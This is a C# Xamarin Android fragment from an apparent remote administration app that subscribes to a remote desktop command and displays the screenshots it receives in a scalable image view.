
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Util;
using Android.Views;
using Android.Widget;
using com.refractored.monodroidtoolkit;

namespace Orcus.Administration.App
{
	public class RemoteDesktopFragment : Fragment
	{
		private ScaleImageView _image;
		private RemoteDesktopCommand _remoteDesktopCommand;

		public override void OnCreate (Bundle savedInstanceState)
		{
			base.OnCreate (savedInstanceState);

			// Create your fragment here
		}

		public override void OnDetach ()
		{
			base.OnDetach ();
			_remoteDesktopCommand.ScreenshotReceived -= Command_ScreenshotReceived;
		}

		public override View OnCreateView (LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)
		{
			// Use this to return your custom view for this Fragment
			// return inflater.Inflate(Resource.Layout.YourFragment, container, false);

			var view = inflater.Inflate (Resource.Layout.RemoteDesktopLayout, null);
			_remoteDesktopCommand = ConnectionManager.Current.CurrentController.Commander.GetCommand<RemoteDesktopCommand>();
			_remoteDesktopCommand.ScreenshotReceived += Command_ScreenshotReceived;
			_image = view.FindViewById<ScaleImageView> (Resource.Id.imageViewMap);
			_image.SetScaleType (ImageView.ScaleType.FitXy);
			if (_remoteDesktopCommand.CurrentImage != null)
				_image.SetImageBitmap (_remoteDesktopCommand.CurrentImage);

			return view;
		}

		void Command_ScreenshotReceived (object sender, Android.Graphics.Bitmap e)
		{
			Activity?.RunOnUiThread (() => _image.SetImageBitmap (e));
		}
	}
}

